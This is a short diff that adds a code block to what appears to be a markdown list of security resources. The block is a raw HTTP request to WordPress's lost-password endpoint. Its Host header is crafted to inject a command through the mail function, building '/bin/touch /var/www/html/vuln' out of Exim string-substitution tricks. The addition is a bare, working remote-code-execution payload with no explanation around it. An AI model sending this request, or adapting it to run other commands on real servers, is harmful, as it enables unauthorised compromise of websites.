@@ -202,3 +202,23 @@ Automated E2E spear phishing on Twitter](https://www.blackhat.com/docs/us-16/mat
 
 
 
+
+
+```
+POST /wp-login.php?action=lostpassword HTTP/1.1
+Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}vuln}} null)
+Connection: close
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: */*
+Content-Length: 56
+Content-Type: application/x-www-form-urlencoded
+
+wp-submit=Get+New+Password&redirect_to=&user_login=admin
+
+```
+
+
+
+
+
+
